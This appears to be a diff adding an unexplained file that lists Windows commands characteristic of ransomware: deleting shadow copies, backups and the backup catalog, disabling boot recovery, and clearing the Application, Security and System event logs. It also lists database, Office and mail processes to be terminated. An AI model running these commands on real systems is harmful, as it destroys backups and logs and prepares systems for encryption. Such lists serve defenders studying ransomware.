@@ -1,0 +1,61 @@
+dism /online /enable-feature /featurename:NetFx3
+vssadmin.exe Delete Shadows /All /Quiet
+bcdedit /set {default} recoveryenabled no
+wmic shadowcopy delete
+wbadmin delete backup
+wbadmin delete systemstatebackup -keepversions:0
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+bcdedit /set {default} recoveryenabled no
+wevtutil.exe clear-log Application
+wevtutil.exe clear-log Security
+wevtutil.exe clear-log System
+wbadmin delete catalog -quiet
+wbadmin delete catalog -quiet
+wbadmin delete systemstatebackup
+
+
+# It's terminates this processes
+
+agntsvc.exe
+agntsvc.exe
+agntsvc.exe
+agntsvc.exe
+dbeng50.exe
+dbsnmp.exe
+encsvc.exe
+excel.exe
+firefoxconfig.exe
+infopath.exe
+isqlplussvc.exe
+msaccess.exe
+msftesql.exe
+mspub.exe
+mydesktopqos.exe
+mydesktopservice.exe
+mysqld-nt.exe
+mysqld-opt.exe
+mysqld.exe
+notepad++.exe
+notepad.exe
+ocautoupds.exe
+ocomm.exe
+ocssd.exe
+onenote.exe
+oracle.exe
+outlook.exe
+powerpnt.exe
+sqbcoreservice.exe
+sqlagent.exe
+sqlbrowser.exe
+sqlservr.exe
+sqlwriter.exe
+steam.exe
+synctime.exe
+tbirdconfig.exe
+thebat.exe
+thebat64.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+xfssvccon.exe
